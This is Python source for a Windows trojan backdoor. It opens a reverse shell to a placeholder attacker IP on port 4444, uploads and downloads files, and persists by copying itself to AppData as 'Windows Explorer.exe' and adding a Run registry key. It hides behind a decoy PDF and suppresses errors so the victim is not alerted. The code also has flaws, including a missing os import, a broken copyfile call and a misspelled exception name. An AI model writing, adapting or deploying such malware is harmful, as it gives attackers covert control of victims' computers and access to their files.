#!/usr/bin/python


import socket
import subprocess
import json
import base64
import sys
import shutil

class Backdoor:
	
	######
	#
	######
	def __init__(self, ip, port):	
		self.persistence()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect(("xx.x.x.xx", 4444))


	######
	#
	######
	def persistence(self):
		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(evil_file_location):
		# Converting the current file refer it to as sys.executable. Otherwise __file__
			shutil.copyfile(sys.executable)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

	######
	#	
	######
	def execute_system_command(self, command):
		# NOCONSOLE argument used with pyinstaller also requires us to add DEVNULL to check_output method.
		# If we were not utilizing check_ouput we would not need to add output->stderr and input->stdin params below
		DEVNULL = open(os.devnull, "wb")
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)


	######
	# data: user command line input. 
	#Serialization implementation using JSON. Trasfer data between client and server. 
	######
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())


	######
	# Method to unwrap received json data. 
	######
	def reliable_receive(self):
		json_data = b""

		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValuError:
				continue
	
	######
	#
	######
	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directiry to " + path


	######
	#
	######
	def write_file(self, path, content):
		with open(path, "wb") as file:
			# Decoding file from base64. Enables download of images (jpg, ...) and txt files (wrd, ...)
			file.write(base64.b64decode(content))
			return "[+] Upload  Successful."

	######
	#
	######
	def read_file(self, path):
		with open(path, "rb") as file:
			# Convert unknown characters in file.read() to known characters using base64
			return base64.b64encode(file.read())

	######
	# Execute class to send and recieve data over TCP connection.
	######
	def run(self):

		while True:
			command = self.reliable_receive()
			
			try:
				if command[0] == "exit":
					self.connection.close()
					# Using sys.exit() will circumvent warning messages to user, and run shell in background.
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download" and len(command) > 1:
					command_result = self.read_file(command[1]).decode()
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.execute_system_command(command).decode()
			except Exception:
				command_result = "[-] Error during command execution."
			
			self.reliable_send(command_result)


# Used when packaging evil fiel with the Trojan masking it. MEIPASS is the default directory pyinstaller uses to place file
file_name = sys._MEIPASS + "\sample.pdf"
# Use Popen to not block the execution of the program
subprocess.Popen(file_name, shell=True)


# Try Catch Block circumvents target user machine from creating an alert, notifying user.
try:
	my_backdoor = Backdoor("XX.X.X.XX", 4444)
	my_backdoor.run()
except Exception:
	sys.exit()
